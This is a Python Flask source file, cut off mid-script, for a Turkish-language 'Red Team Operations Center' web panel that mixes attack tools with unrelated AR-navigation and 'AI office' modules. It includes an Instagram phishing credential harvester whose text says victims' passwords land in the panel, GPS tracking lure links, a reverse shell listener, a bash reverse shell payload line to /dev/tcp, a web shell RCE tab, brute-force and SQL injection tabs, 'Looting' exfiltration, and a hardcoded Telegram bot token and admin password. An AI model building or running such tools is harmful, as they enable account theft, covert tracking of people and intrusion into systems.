import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
CLICK_LOGS = []
CREDENTIAL_LOGS = []
DRIVING_SESSIONS = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #121824; padding: 40px; border-radius: 6px; border: 1px solid #00ff66; box-shadow: 0 0 25px rgba(0,255,102,0.2); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; text-shadow: 0 0 10px rgba(56,189,248,0.4); }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 15px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; font-family: 'Courier New', Courier, monospace; transition: 0.2s; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>kali@root-terminal:~#</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1350px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
        h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .logout-btn:hover { background: #7f1d1d; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; background: #0a0e17; padding: 8px; border-radius: 6px; border: 1px solid #1e293b; }
        .tab-btn { background: #1a2332; color: #94a3b8; border: 1px solid #283548; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; font-family: 'Courier New', Courier, monospace; }
        .tab-btn:hover { background: #283548; color: #fff; }
        .tab-btn.active { background: #0284c7; color: white; border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        label { color: #38bdf8; font-size: 13px; font-weight: bold; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
        textarea { resize: vertical; height: 100px; }
        button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        button.secondary { background: #0d9488; }
        button.success { background: #15803d; }
        button.danger { background: #b91c1c; }
        .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #161f30; }
        .mini-map { width: 160px; height: 100px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
        .snapshot-img { width: 90px; height: 65px; border-radius: 4px; border: 1px solid #334155; object-fit: cover; }
        .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
        
        /* Gelişmiş Cyberpunk AR HUD Stilleri & Incline HUD */
        .ar-container { position: relative; width: 100%; max-width: 720px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); transition: 0.3s; }
        .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
        #arVideo { width: 100%; height: 450px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); transition: filter 0.3s; }
        .ar-container:fullscreen #arVideo { height: 100vh; }
        #arCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        
        .ar-hud { position: absolute; top: 15px; left: 15px; right: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #00ff66; padding: 10px 15px; border-radius: 6px; font-size: 12px; color: #00ff66; z-index: 10; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s, border-color 0.3s; }
        .ar-weather-hud { position: absolute; top: 75px; right: 15px; background: rgba(11, 15, 21, 0.8); border: 1px solid #38bdf8; padding: 6px 10px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; pointer-events: none; }
        .ar-fuel-hud { position: absolute; top: 75px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #facc15; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #facc15; z-index: 10; font-weight: bold; }
        .ar-drag-hud { position: absolute; bottom: 15px; left: 15px; background: rgba(11, 15, 21, 0.9); border: 1px solid #ef4444; padding: 8px 14px; border-radius: 6px; font-size: 12px; color: #ef4444; z-index: 10; font-weight: bold; }
        .ar-gforce-hud { position: absolute; bottom: 70px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #38bdf8; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; font-weight: bold; }
        .ar-incline-hud { position: absolute; bottom: 125px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #a855f7; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #a855f7; z-index: 10; font-weight: bold; }
        
        .ar-speed-limit-hud { position: absolute; top: 125px; right: 15px; width: 48px; height: 48px; background: #ffffff; border: 4px solid #dc2626; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 15px; color: #000000; box-shadow: 0 0 12px rgba(220,38,38,0.6); z-index: 10; transition: 0.3s; }
        .ar-speed-limit-hud.speeding { background: #dc2626; color: #ffffff; animation: pulseLimit 0.6s infinite alternate; }
        @keyframes pulseLimit { from { transform: scale(1); } to { transform: scale(1.12); } }

        .ar-controls { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
        .ar-controls label { color: #e2e8f0; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; }
        .ar-controls input[type="checkbox"] { accent-color: #00ff66; width: 16px; height: 16px; cursor: pointer; }
        
        .ar-log-box { background: #05070a; border: 1px solid #38bdf8; border-radius: 6px; padding: 12px; margin-top: 15px; max-height: 160px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 12px; color: #38bdf8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>kali@kali-linux:~/red-team-ops#</h1>
            <a href="/logout" class="logout-btn">[x] Logout</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
            <button class="tab-btn" onclick="switchTab('officeTab')">🏢 Canlı AI Ofisi</button>
            <button class="tab-btn" onclick="switchTab('wifiScannerTab')">📡 Wi-Fi Scanner (Ruview)</button>
            <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Tracker</button>
            <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR Navigasyon & AI</button>
            <button class="tab-btn" onclick="switchTab('drivingTab')">⛽ Sürüş Raporları & Kara Kutu</button>
            <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
            <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
            <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
            <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
            <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
            <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ SQLmap</button>
            <button class="tab-btn" onclick="switchTab('subdomainTab')">🌐 Subdomain</button>
            <button class="tab-btn" onclick="switchTab('bruteTab')">🔐 Brute</button>
            <button class="tab-btn" onclick="switchTab('shellTab')">💻 Web Shell</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')">🏴‍☠️ Looting</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Secret</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payloads</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Archive</button>
        </div>

        <!-- 1. Keşif -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label>Target URL / IP:</label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Execute Comprehensive Recon</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 Save TXT</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Export PDF</button>
                <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- Canlı AI Ofisi Sekmesi -->
        <div id="officeTab" class="tab-content">
            <h3>🏢 Canlı Otonom AI Yazılım Ofisi & Ajans Merkezi</h3>
            <p style="color: #94a3b8; font-size: 13px;">Aşağıdaki interaktif ofis simülasyonunda yapay zeka çalışanların anlık hareketlerini izleyebilir, onlara emir vererek Android dersleri ve animasyonlu web siteleri ürettirebilirsin.</p>

            <div style="position: relative; width: 100%; height: 380px; background: #05070a; border: 2px solid #38bdf8; border-radius: 8px; overflow: hidden; margin-bottom: 20px;">
                <canvas id="officeCanvas" width="900" height="380" style="width: 100%; height: 100%; display: block;"></canvas>
                <div style="position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.85); padding: 8px 12px; border-radius: 4px; border: 1px solid #00ff66; font-size: 12px; color: #00ff66;">
                    🟢 Ofis Durumu: <span id="officeStatusText">Beklemede (Patron Emri Bekleniyor)</span>
                </div>
            </div>

            <div class="form-group">
                <label>👑 Şirket Patronu Olarak Emriniz / Proje Talebiniz:</label>
                <textarea id="bossCommand" placeholder="Örn: Android için 'Kotlin ile Retrofit Kullanımı' dersi hazırla, ardından buna uygun animasyonlu bir web sitesi yap ve sosyal medyada pazarla..."></textarea>
            </div>
            <button class="success" onclick="dispatchBossCommand()">🚀 Emri Ajansa Dağıt & Başlat</button>

            <h4 style="margin-top: 25px; color: #38bdf8;">📋 Ajans Canlı Operasyon Logları:</h4>
            <div id="agencyTerminal" class="terminal" style="max-height: 220px;">[16:25:00] AI Yazılım Ofisi mesaiye başladı. Patronun talimatları bekleniyor...</div>
        </div>

        <!-- Wi-Fi Scanner (ruvnet/ruview) Sekmesi -->
        <div id="wifiScannerTab" class="tab-content">
            <h3>📡 Wi-Fi Scanner & Ruview Visualizer (ruvnet/ruview)</h3>
            <p style="color: #94a3b8; font-size: 13px;">Bu modül GitHub üzerindeki <b>ruvnet/ruview</b> projesini tetikleyerek çevredeki kablosuz ağları, sinyal güçlerini ve cihaz haritasını çıkarır.</p>
            <div class="form-group"><label>Arayüz / Interface:</label><input type="text" id="ruviewIface" value="wlan0"></div>
            <div class="form-group"><label>Tarama Modu:</label><select id="ruviewMode"><option value="active">Aktif Sinyal Taraması</option><option value="passive">Pasif Dinleme (Monitor Mode)</option></select></div>
            <button class="success" onclick="startRuviewScan()">🚀 Ruview Taramasını Başlat</button>
            <div id="ruviewStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="ruviewResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- Instagram Phishing Sekmesi -->
        <div id="phishTab" class="tab-content">
            <h3>📸 Instagram Phishing & Credential Harvester</h3>
            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak sahte Instagram giriş linkini kopyalayın. Şifreyi girenlerin bilgileri anında panele düşer.</p>
            <div class="form-group"><label>Sahte Instagram Giriş Linki:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
            <button class="success" onclick="generateInstaLink()">Link Üret</button>
            <h4 style="margin-top: 25px;">🎯 Yakalanan Instagram Hesap Bilgileri:</h4>
            <div id="credsContainer"><p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p></div>
        </div>

        <!-- Lure Link & Tracker Sekmesi -->
        <div id="lureTab" class="tab-content">
            <h3>🎯 Gelişmiş GPS & Cihaz İstihbarat Tracker</h3>
            <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
            <button class="success" onclick="generateLureLink()">Gelişmiş Takip Linki Üret</button>
            <div class="form-group" style="margin-top: 20px;"><label>Oluşturulan Takip Linki:</label><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & Cihaz İstihbaratı:</h4>
            <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
        </div>

        <!-- AR Navigasyon & Taktiksel HUD Modülü -->
        <div id="arNavTab" class="tab-content">
            <h3>🧭 AR Navigasyon, Yakıt, ETA, 0-100, Hız Limiti, G-Force & Eğim Ölçer</h3>
            <p style="color: #94a3b8; font-size: 13px;">Yokuş eğim derecesi, G-Force, hız limiti, yakıt ve kara kutu telemetrisi tam entegre çalışır.</p>
            
            <div class="ar-controls">
                <span style="color:#38bdf8; font-weight:bold;">HUD Modül Kontrolleri:</span>
                <label><input type="checkbox" id="chkAutoDim" checked> 🌙 Auto-Dimming (Gece Karartma)</label>
                <label><input type="checkbox" id="chkLane" checked> 🚧 Şerit Takip Asistanı</label>
                <label><input type="checkbox" id="chkSpeedLimit" checked> 🚸 Dinamik Hız Limiti</label>
                <label><input type="checkbox" id="chkGForce" checked> 🌀 G-Force Ölçer</label>
                <label><input type="checkbox" id="chkIncline" checked> 📈 Yokuş & Eğim Ölçer</label>
                <label><input type="checkbox" id="chkNightVision"> 🔦 Gece Görüşü / Termal Mod</label>
                <label><input type="checkbox" id="chkCompass"> Jiroskop & Pusula</label>
                <label><input type="checkbox" id="chkSpatial" checked> Sesli Asistan</label>
                <label><input type="checkbox" id="chkAudioAlarm" checked> 🚨 Sesli Engel / Hız Alarmı</label>
            </div>

            <div class="form-group">
                <label>Hedef Operasyon / Konum:</label>
                <input type="text" id="arDestination" value="Saha Bölge Komuta Merkezi B-2">
            </div>
            
            <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
                <button class="success" onclick="startARCamera()">📸 Kamerayı Aç & AR Başlat</button>
                <button class="secondary" onclick="startDragTest()">⏱️ 0-100 Testini Başlat</button>
                <button class="success" onclick="finishDrivingSession()">🏁 Sürüşü Bitir & Rapor Al</button>
                <button class="secondary" onclick="toggleFullScreen()">📺 Tam Ekran</button>
                <button class="success" onclick="takeSnapshot()">📷 Kanıt / Fotoğraf Al</button>
                <button class="danger" onclick="stopARCamera()">🛑 Sistemi Kapat</button>
            </div>

            <div class="ar-container" id="arBox">
                <div class="ar-hud" id="arHudBox">
                    <span id="arHudText">Durum: Bekleniyor...</span>
                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 0 km/s | ETA: --</span>
                </div>
                <div id="arFuelHud" class="ar-fuel-hud">⛽ Yakıt: %85 | Menzil: 240 km</div>
                <div id="arDragHud" class="ar-drag-hud">⏱️ 0-100 Drag: Hazır (0.00s)</div>
                <div id="arGForceHud" class="ar-gforce-hud">🌀 G-Force: Lat 0.00G | Long 0.00G</div>
                <div id="arInclineHud" class="ar-incline-hud">📈 Eğim: %0 (0°)</div>
                <div id="arSpeedLimitHud" class="ar-speed-limit-hud">50</div>
                <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Rüzgar: 12 km/s</div>
                
                <video id="arVideo" autoplay playsinline muted></video>
                <canvas id="arCanvas"></canvas>
            </div>

            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Eğim & Kara Kutu Log Akışı:</h4>
            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Yokuş eğim derecesi ölçer ve telemetri kayıt sistemi aktif.</div>
        </div>

        <!-- Sürüş Raporları & Kara Kutu Sekmesi -->
        <div id="drivingTab" class="tab-content">
            <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan sürüş telemetrilerini, maksimum eğim değerlerini ve raporu buradan indirebilirsin.</p>
            <div id="drivingReportsContainer">
                <p style='color:#94a3b8;'>Henüz kaydedilmiş sürüş raporu yok. AR Navigasyon sekmesinden sürüşü başlatıp bitirebilirsiniz.</p>
            </div>
        </div>

        <!-- Diğer Standart Sekmeler -->
        <div id="crackerTab" class="tab-content">
            <h3>🔑 Hash Cracker & Şifre Çözücü</h3>
            <div class="form-group"><label>Hash Tipi:</label><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
            <div class="form-group"><label>Hedef Hash:</label><input type="text" id="targetHash" placeholder="örn: 5d41402abc4b2a76b9719d911017c592"></div>
            <div class="form-group"><label>Wordlist (Her satıra bir şifre):</label><textarea id="wordlistArea">admin\n123456\npassword\nroot1\ntoor1\nhello\nsecret\nkali</textarea></div>
            <button class="danger" onclick="startHashCrack()">Hash Çözmeyi Başlat</button>
            <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="shellListenerTab" class="tab-content">
            <h3>💻 Reverse Shell Dinleyicisi (Multi-Handler)</h3>
            <div class="form-group"><label>Dinlenecek Port (LPORT):</label><input type="number" id="listenerPort" value="4444"></div>
            <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
            <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="telegramTab" class="tab-content">
            <h3>🤖 Telegram Bot Notification Tester</h3>
            <div class="form-group"><label>Telegram Chat ID:</label><input type="text" id="testChatId" value="{{ default_chat_id }}"></div>
            <button class="success" onclick="sendTelegramTest()">🚀 Test Mesajı Gönder</button>
            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top: 15px;"></div>
        </div>

        <div id="wifiTab" class="tab-content">
            <h3>📶 Real Wi-Fi Audit & Interface Controller</h3>
            <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
            <div id="wifiResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="niktoTab" class="tab-content">
            <h3>Nikto Web Vulnerability Scanner</h3>
            <div class="form-group"><label>Target URL:</label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
            <button class="secondary" onclick="startNiktoScan()">Run Nikto Module</button>
            <div id="niktoStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="niktoResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="dnsTab" class="tab-content">
            <h3>DNS & Zone Enumeration</h3>
            <div class="form-group"><label>Domain:</label><input type="text" id="dnsDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startDnsRecon()">Query DNS Records</button>
            <div id="dnsStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="dnsResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="sqlmapTab" class="tab-content">
            <h3>Automated SQL Injection (SQLmap Lite)</h3>
            <div class="form-group"><label>Vulnerable URL:</label><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"></div>
            <button class="danger" onclick="startSqlmapLite()">Run SQLi Exploit Test</button>
            <div id="sqlmapStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="sqlmapResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="subdomainTab" class="tab-content">
            <h3>Gobuster Subdomain Brute-Forcer</h3>
            <div class="form-group"><input type="text" id="subDomainInput" placeholder="example.com"></div>
            <button onclick="startSubdomainScan()">Start Subdomain Brute</button>
            <div id="subStatus" class="loading"></div>
            <div id="subResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="bruteTab" class="tab-content">
            <h3>Login Form Fuzzing & Brute-Force</h3>
            <div class="form-group"><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="usernameField" placeholder="User field" style="flex:1;"><input type="text" id="passwordField" placeholder="Pass field" style="flex:1;"></div>
            <div class="form-group"><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startBruteForce()">Launch Brute Attack</button>
            <div id="bruteStatus" class="loading"></div>
            <div id="bruteResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="shellTab" class="tab-content">
            <h3>Interactive Web Shell (RCE)</h3>
            <div class="form-group"><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
            <button class="danger" onclick="executeWebShell()">Execute Command</button>
            <div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="lootingTab" class="tab-content">
            <h3>Exfiltrate Harvested Data (ZIP Archive)</h3>
            <div class="form-group"><select id="lootingTargetSelect"><option value="">No targets scanned yet...</option></select></div>
            <button class="success" onclick="downloadLootZip()">Download Loot ZIP</button>
        </div>

        <div id="analysisTab" class="tab-content">
            <h3>Secret & Credential Scanner</h3>
            <div class="form-group"><input type="file" id="analysisFile"></div>
            <button class="secondary" onclick="uploadAndAnalyzeFile()">Scan File for Secrets</button>
            <div id="analysisStatus" class="loading"></div>
            <div id="analysisResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="payloadTab" class="tab-content">
            <h3>Reverse Shell Generator</h3>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/${ip}/${port} 0>&1</code></div>
        </div>

        <div id="dataTab" class="tab-content">
            <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
            <h3>Operations Analytics</h3>
            <div class="dashboard-row">
                <div class="dashboard-card"><h4>Security Grade Distribution</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
                <div class="dashboard-card"><h4>WAF Protection Status</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
            </div>
            <h3>Archived Targets</h3>
            <div id="databaseTableContainer">No archived data.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        let arStream = null, arInterval = null, compassHeading = 0, deviceBeta = 0;
        let currentDistance = 150, currentSpeed = 35, fuelLevel = 85, drivingRange = 240;
        let sessionLogs = [], lastSpokenTime = 0, lastLaneWarningTime = 0, lastSpeedWarningTime = 0;
        let dragTesting = false, dragStartTime = 0, bestDragTime = null;
        let currentSpeedLimit = 50;
        let currentLatG = 0, currentLongG = 0, maxRecordedG = 0;
        let currentInclineDeg = 0, maxRecordedIncline = 0;

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.currentTarget.classList.add('active');
            
            if(tabId === 'drivingTab') loadDrivingReports();
            if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
            if(tabId === 'lureTab') loadClickLogs();
            if(tabId === 'phishTab') loadCreds();
            if(tabId !== 'arNavTab') stopARCamera();
        }

        // --- Canlı AI Ofisi Canvas Animasyon Motoru ---
        let officeCanvas = document.getElementById('officeCanvas');
        let oCtx = officeCanvas ? officeCanvas.getContext('2d') : null;

        let officeAgents = [
            { name: "Patron (Boss AI)", x: 120, y: 70, color: "#38bdf8", status: "Komuta Merkezinde", targetX: 120, targetY: 70 },
            { name: "Android Eğitmeni", x: 280, y: 190, color: "#00ff66", status: "Beklemede", targetX: 280, targetY: 190 },
            { name: "Web Tasarımcı", x: 480, y: 190, color: "#a855f7", status: "Beklemede", targetX: 480, targetY: 190 },
            { name: "Pazarlamacı", x: 680, y: 190, color: "#facc15", status: "Beklemede", targetX: 680, targetY: 190 },
            { name: "Kahve & Sunucu", x: 800, y: 70, color: "#ef4444", status: "Aktif", targetX: 800, targetY: 70 }
        ];

        function drawOffice() {
            if(!oCtx) return;
            oCtx.clearRect(0, 0, officeCanvas.width, officeCanvas.height);

            oCtx.strokeStyle = "#1e293b";
            oCtx.lineWidth = 2;
            oCtx.strokeRect(30, 20, 840, 340);

            officeAgents.forEach((ag, idx) => {
                if(idx > 0 && idx < 4) {
                    oCtx.fillStyle = "#121824";
                    oCtx.fillRect(ag.x - 35, ag.y - 25, 70, 50);
                    oCtx.strokeStyle = ag.color;
                    oCtx.strokeRect(ag.x - 35, ag.y - 25, 70, 50);
                }

                ag.x += (ag.targetX - ag.x) * 0.06;
                ag.y += (ag.targetY - ag.y) * 0.06;

                oCtx.fillStyle = ag.color;
                oCtx.beginPath();
                oCtx.arc(ag.x, ag.y, 14, 0, Math.PI * 2);
                oCtx.fill();

                oCtx.fillStyle = "#e2e8f0";
                oCtx.font = "11px Courier New";
                oCtx.fillText(ag.name, ag.x - 40, ag.y - 30);
                oCtx.fillStyle = ag.color;
                oCtx.fillText(`[${ag.status}]`, ag.x - 45, ag.y + 32);
            });

            requestAnimationFrame(drawOffice);
        }
        if(officeCanvas) drawOffice();

        async function dispatchBossCommand() {
            let cmd = document.getElementById('bossCommand').value.trim();
            let terminal = document.getElementById('agencyTerminal');
            let statusText = document.getElementById('officeStatusText');
            if(!cmd) { alert('Lütfen ajansa bir emir ver kanka!'); return; }

            statusText.innerText = "Operasyon Çalışıyor (Ajanlar Görevde)";
            terminal.innerHTML += `<br>[${new Date().toLocaleTimeString()}] 👑 PATRON EMRİ: "${cmd}"`;

            officeAgents[1].targetX = 320; officeAgents[1].targetY = 280; officeAgents[1].status = "Android Dersi Kodluyor";
            officeAgents[2].targetX = 520; officeAgents[2].targetY = 280; officeAgents[2].status = "Animasyonlu Web Tasarlıyor";
            officeAgents[3].targetX = 720; officeAgents[3].targetY = 280; officeAgents[3].status = "Sosyal Medyada Pazarlıyor";

            let res = await fetch('/api/agency/execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ command: cmd })
            });
            let data = await res.json();

            terminal.innerHTML += `<br><b style="color:#00ff66;">[AJANS RAPORU]:</b><br>` + data.output.replace(/\n/g, '<br>');
            terminal.scrollTop = terminal.scrollHeight;

            setTimeout(() => {
